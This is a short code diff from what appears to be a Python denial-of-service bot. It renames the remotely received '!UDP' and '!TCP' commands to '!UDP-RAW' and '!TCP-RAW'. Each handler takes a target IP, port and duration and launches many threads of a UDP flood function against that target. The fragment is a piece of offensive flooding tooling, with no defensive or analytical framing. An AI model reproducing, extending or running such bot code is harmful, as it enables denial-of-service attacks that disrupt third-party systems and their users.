@@ -135,7 +135,7 @@ def main():
                 args = data.split(' ')
                 command = args[0].upper()
 
-                if command == '!UDP':
+                if command == '!UDP-RAW':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
@@ -145,7 +145,7 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
-                if command == '!TCP':
+                if command == '!TCP-RAW':
                     ip = args[1]
                     port = int(args[2])
                     duration = int(args[3])
